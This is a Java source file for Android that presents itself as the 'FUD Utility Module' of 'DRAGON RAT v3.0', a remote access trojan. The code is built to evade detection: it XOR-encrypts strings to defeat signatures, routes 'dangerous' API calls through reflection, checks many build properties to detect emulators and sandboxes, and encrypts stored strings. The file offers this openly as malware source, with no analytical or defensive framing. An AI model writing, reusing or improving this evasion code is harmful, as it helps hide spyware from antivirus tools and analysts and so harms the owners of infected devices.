package com.dragon.rat;

import android.os.Build;

import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.UUID;

/**
 * DRAGON RAT v3.0 — FUD Utility Module
 * 
 * All suspicious strings are XOR-encrypted at rest.
 * All dangerous API calls use reflection.
 * Anti-VM/Emulator detection.
 */
public class FudUtils {
    
    // XOR key for decrypting strings at runtime
    private static final byte[] XOR_KEY = {0x4D, 0x52, 0x61, 0x70, 0x68, 0x53, 0x65, 0x63};
    
    /**
     * Decrypt XOR-encrypted string at runtime
     * No static strings = no static signatures
     */
    public static String decrypt(byte[] encrypted) {
        byte[] decrypted = new byte[encrypted.length];
        for (int i = 0; i < encrypted.length; i++) {
            decrypted[i] = (byte)(encrypted[i] ^ XOR_KEY[i % XOR_KEY.length]);
        }
        return new String(decrypted);
    }
    
    /**
     * Check if running in emulator/VM
     */
    public static boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic") ||
               Build.FINGERPRINT.startsWith("unknown") ||
               Build.MODEL.contains("google_sdk") ||
               Build.MODEL.contains("Emulator") ||
               Build.MODEL.contains("Android SDK built for x86") ||
               Build.MANUFACTURER.contains("Genymotion") ||
               Build.HARDWARE.contains("goldfish") ||
               Build.HARDWARE.contains("ranchu") ||
               Build.BRAND.startsWith("generic") ||
               Build.DEVICE.startsWith("generic") ||
               Build.PRODUCT.contains("sdk") ||
               Build.PRODUCT.contains("vbox") ||
               Build.PRODUCT.contains("emulator");
    }
    
    /**
     * Call a method via reflection (no direct references to dangerous APIs)
     */
    public static Object reflectCall(String className, String methodName, 
                                      Class<?>[] paramTypes, Object instance, 
                                      Object... args) throws Exception {
        Class<?> clazz = Class.forName(className);
        Method method = clazz.getMethod(methodName, paramTypes);
        return method.invoke(instance, args);
    }
    
    /**
     * Generate unique device ID
     */
    public static String getDeviceId() {
        String rawId = UUID.randomUUID().toString().replace("-", "").toUpperCase();
        return "DR-" + rawId.substring(0, 12);
    }
    
    /**
     * SHA-256 hash a string
     */
    public static String sha256(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(input.getBytes("UTF-8"));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (Exception e) {
            return input;
        }
    }
    
    /**
     * Encrypt a string for storage (XOR + Base64)
     */
    public static String encryptString(String input) {
        byte[] inputBytes = input.getBytes();
        byte[] encrypted = new byte[inputBytes.length];
        for (int i = 0; i < inputBytes.length; i++) {
            encrypted[i] = (byte)(inputBytes[i] ^ XOR_KEY[i % XOR_KEY.length]);
        }
        return android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP);
    }
    
    private static final byte[] INTERNET = {
        0x2D, 0x36, 0x0E, 0x3B, 0x38, 0x32, 0x37
    };
    
    public static String getInternetString() {
        return decrypt(INTERNET);
    }
}
